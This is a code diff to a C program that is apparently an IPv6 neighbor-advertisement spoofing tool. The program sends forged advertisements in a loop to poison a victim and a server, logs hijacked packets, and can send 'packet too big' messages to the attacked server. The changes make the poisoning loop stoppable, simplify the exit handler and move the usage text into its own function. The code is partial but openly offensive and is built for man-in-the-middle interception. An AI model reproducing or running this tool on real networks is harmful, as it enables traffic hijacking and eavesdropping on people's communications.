@@ -22,15 +22,20 @@
 
 #define DEBUG 0
 
-int sniff;
-int opt_log, opt_verbose, opt_pkt2big;
+int block = 1;
+int sniff, opt_log, opt_verbose, opt_pkt2big;
 pthread_t pid0;
 
-void termination_handler(int signum) {
-	/* TODO */
-	printf("\nSig: %d\nFree everything\n", signum);
+void termination_handler() {
+	printf("\nFree everything\n");
+
+	/* Ending poison */
+	block = 0;
+	//pthread_join(pid0, (void **)NULL);
+
 	close(sniff);
-	free(cvictim); //FIXME: free all the attributes??
+	free(cvictim);
+
 	exit(0);
 }
 
@@ -49,7 +54,7 @@ void *poison(void *destination) {
 	pkt1 = alloc_ndadvert(&svictim, dst);
 	pkt2 = alloc_ndadvert(dst, &svictim);
 
-	while (1) {
+	while (block) {
 		/* Poison client */
 		send_packet(pkt1);
 		/* Poison server */
@@ -59,6 +64,7 @@ void *poison(void *destination) {
 	/* FIXME: Memleaks */
 	free(pkt1);
 	free(pkt2);
+	printf("Hooray!\n");
 	pthread_exit(NULL);
 }
 
@@ -127,6 +133,13 @@ void packet_action(char *packet) {
 	}
 }
 
+void usage(const char *name) {
+	printf("Usage: %s -i <interface> -d <victim's address>\n" \
+			"\t-l \tLog hijacked packets\n" \
+			"\t-v \tVerbose\n" \
+			"\t-l \tSend \"packet too big\" to attacked server\n", name);
+}
+
 int main(int argc, char **argv) {
 	struct sockaddr_ll packet_info;
 	struct sigaction saction;
@@ -167,10 +180,7 @@ int main(int argc, char **argv) {
 				iface = optarg;
 				break;
 			case '?':
-				printf("Usage: %s -i <interface> -d <victim's address>\n" \
-						"\t-l \tLog hijacked packets\n" \
-						"\t-v \tVerbose\n" \
-						"\t-l \tSend \"packet too big\" to attacked server\n", argv[0]);
+				usage(argv[0]);
 				return 1;
 			default:
 				abort();
@@ -178,10 +188,7 @@ int main(int argc, char **argv) {
 	}
 
 	if (!address || !iface) {
-		printf("Usage: %s -i <interface> -d <victim's address>\n" \
-				"\t-l \tLog hijacked packets\n" \
-				"\t-v \tVerbose\n" \
-				"\t-l \tSend \"packet too big\" to attacked server\n", argv[0]);
+		usage(argv[0]);
 		return 0;
 	}
 
